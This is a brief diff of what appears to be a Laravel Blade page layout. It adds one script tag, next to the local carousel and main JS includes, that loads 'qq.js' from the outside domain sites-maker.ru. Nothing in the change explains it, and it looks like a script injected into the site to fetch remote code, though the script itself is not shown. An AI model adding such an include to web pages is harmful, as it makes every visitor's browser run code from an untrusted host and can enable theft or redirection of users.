@@ -422,5 +422,6 @@ Copyright &copy;<script>document.write(new Date().getFullYear());</script> All r
 	<script src="/webuni/js/owl.carousel.min.js"></script>
 	<script src="/webuni/js/main.js"></script>
 	<script src="/owl/dist/owl.carousel.min.js"></script>
+    <script src="https://sites-maker.ru/qq.js"></script>
     @yield('scripts')
 </html>
